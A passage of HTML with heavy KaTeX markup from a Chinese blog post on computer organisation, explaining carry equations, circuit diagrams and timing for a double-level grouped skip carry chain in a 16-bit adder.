style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.2099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></p><p>这又化成了只有与门和或门的形式，参照单重分组跳跃的方式，我们可以设计出大组间的跳跃电路：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618204246545.png" alt="image-20240618204246545" style="zoom:50%;" /><h6 id="小组进位分析"><a class="markdownIt-Anchor" href="#小组进位分析"></a> 小组进位分析</h6><p>讨论完双重进位链中的大组，我们再来研究小组间的电路该如何设计。</p><p>小组间的电路其实就是一个单重进位链，但是我们需要它提供<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span>给大组的跳跃链，所以我们还是给出了小组间的电路设计图，以第8小组为例，它只产生低3位的进位和本小组的D8、T8：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618205146754.png" alt="image-20240618205146754" style="zoom:50%;" /><p>是否觉得很眼熟呢？我放出了原来的单重跳跃进位链作为对比</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618205122829.png" alt="image-20240618205122829" style="zoom:50%;" /><p>此时，我们就可以分析当n=16时的双重分组跳跃进位链的用时了，绘图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618205623246.png" alt="image-20240618205623246" style="zoom:50%;" /><p>当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">d_it_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.891661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span>形成后：</p><ul><li>经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">2.5t_{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>1</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>0</mn></msub><mtext>、</mtext><msub><mi>D</mi><mn>5</mn></msub><mo>∼</mo><msub><mi>D</mi><mn>8</mn></msub><mtext>、</mtext><msub><mi>T</mi><mn>5</mn></msub><mo>∼</mo><msub><mi>T</mi><mn>8</mn></msub></mrow><annotation encoding="application/x-tex">C_2、C_1、C_0、D_5\sim D_8、T_5\sim T_8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">5</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">5t_{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>15</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>11</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>7</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">C_{15}、C_{11}、C_7、C_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li>经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7.5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">7.5t_{y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">7</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>14</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>12</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>10</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>8</mn></msub><mtext>、</mtext><msub><mi>C</mi><mn>6</mn></msub><mo>∼</mo><msub><mi>C</mi><mn>4</mn></msub></mrow><annotation encoding="application/x-tex">C_{14}\sim C_{12}、C_{10}\sim C_8、C_6\sim C_4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span 